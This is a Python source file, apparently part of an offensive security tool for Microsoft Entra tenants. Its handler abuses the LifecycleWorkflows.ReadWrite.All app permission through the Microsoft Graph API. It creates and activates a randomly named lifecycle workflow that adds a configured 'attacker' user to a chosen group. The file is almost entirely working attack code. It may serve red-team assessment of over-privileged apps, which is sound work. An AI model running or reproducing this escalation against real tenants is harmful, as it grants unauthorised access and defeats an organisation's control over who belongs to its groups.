from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests
import random, string

logger = logger.createLogger('attacks.handlers.lifecycle_groups_handler')


class Lifecycle_GroupHandler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        # TODO map request.roles to fit with this attack
        if "LifecycleWorkflows.ReadWrite.All" in request.roles:
            status = False
            attack_name = "LifecycleWorkflowsGroupswordVectors"
            message = ""
            error = "LifecycleWorkflowsGroupswordVectors - failed"
            conf = request.attack_config['lifecycle']
            logger.debug("LifecycleWorkflows.ReadWrite.All - Allows the app to create, update, list, read and delete all workflows, tasks and related lifecycle workflows resources without a signed-in user.")
            logger.debug("Attack vector - add to groups.")
            try:
                letters = string.ascii_lowercase
                displayname = ''.join(random.choice(letters) for i in range(15))
                create_message_URL = "https://graph.microsoft.com/v1.0/identityGovernance/lifecycleWorkflows/workflows"
                message_obj = {"category":"mover","displayName":"Real-time PermissionPanic to group " + displayname,"description":"Execute real-time tasks for employee job changes","tasks":[{"arguments":[{"name":"groupID","value":conf["groupId"]}],"description":"Add user to selected groups","displayName":"Add user to groups " + displayname,"isEnabled":"true","continueOnError":"false","taskDefinitionId":"22085229-5809-45e8-97fd-270d28d66910","category":"joiner,leaver,mover"}],"executionConditions":{"@odata.type":"#microsoft.graph.identityGovernance.onDemandExecutionOnly"},"isEnabled":"true","isSchedulingEnabled":"false"}
                result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)
                json = result.json()
                id = json["id"]

                if result.status_code == 201:
                    create_message_URL = "https://graph.microsoft.com/v1.0/identityGovernance/lifecycleWorkflows/workflows/" + id + "/activate"
                    message_obj = {"subjects": [{"id": conf["attacker"]}]}
                    result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)
                    
                    if result.status_code == 204:
                        message += "added user %s to group %s  \n" % (conf["attacker"], conf["groupId"])
                        status = True
                        
                    
                if message == "":
                    message = error
            except:
                logger.error("Unexpected exception in lifecycle_groups_handler function")

            
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))



        return super().handle(request,responses)
